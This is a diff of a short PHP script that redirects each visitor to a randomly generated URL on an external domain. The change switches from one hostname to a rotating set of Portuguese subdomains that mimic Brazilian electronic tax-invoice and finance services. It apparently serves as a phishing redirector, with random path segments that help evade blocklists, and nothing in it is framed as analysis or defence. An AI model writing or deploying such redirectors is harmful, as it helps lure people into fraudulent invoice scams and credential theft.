@@ -1,17 +1,26 @@
 <?php
-$baseUrl = 'https://nf-fiscalcompras.dgsalvadormunoz.com/';
 
-function generateSegment($length) {
-  $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-  return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
-}
-
-$urls = [
-  $baseUrl . generateSegment(8) . '/' . generateSegment(8) . '/' . generateSegment(8),
-  $baseUrl . generateSegment(8) . '/' . generateSegment(8) . '/' . generateSegment(8),
+$subdomains = [
+    'notasfiscal',
+    'administracao',
+    'emisao-nota',
+    'nfs-e-processada',
+    'financeiro'
 ];
 
-$randomUrl = $urls[array_rand($urls)];
-header("Location: " . $randomUrl);
+function generateSegment($length) {
+    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    return substr(str_shuffle(str_repeat($chars, $length)), 0, $length);
+}
+
+// escolhe 1 subdomínio aleatório por acesso
+$randomSubdomain = $subdomains[array_rand($subdomains)];
+
+$url = 'https://' . $randomSubdomain . '.dgsalvadormunoz.com/'
+    . generateSegment(8) . '/'
+    . generateSegment(8);
+
+header("Location: " . $url);
 exit();
+
 ?>
